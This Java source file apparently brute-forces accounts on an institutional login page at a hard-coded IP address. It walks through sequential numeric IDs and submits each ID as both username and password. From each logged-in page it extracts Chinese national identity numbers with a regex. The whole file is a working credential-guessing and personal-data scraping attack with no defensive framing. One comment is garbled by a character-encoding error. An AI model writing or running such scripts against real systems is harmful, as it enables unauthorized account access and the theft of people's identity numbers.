package test2;

import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class test {

	public static void main(String[] args) {
		long j=2015013908;
		for(int i=0;i<10;i++){
        	j++;
        	String a="user"+"="+j;
        	String b="pw"+"="+j;
        	String c=a+"&"+b;
        	//·¢ËÍ POST ÇëÇó
        	String sr=HttpRequest.sendPost("http://211.70.171.1/list/dzjs/login.asp", c);
        	String s=HttpRequest.sendPost("http://211.70.171.1/list/dzjs/login_form.asp", "");
        	System.out.println(test.getVlues(s));
        }
    }
	public static String getVlues(String values) {
		String str = "\\d{6}((19|20)\\d{2})((0[0-9])|(1[0-2]))(((0|1|2)[0-9])|(3[0,1]))\\d{3}[xX\\d]";
		Pattern pattern = Pattern.compile(str);
		Matcher matcher = pattern.matcher(values);
		if (matcher.find()) {
		return matcher.group();
		}
		return "";
		}
}
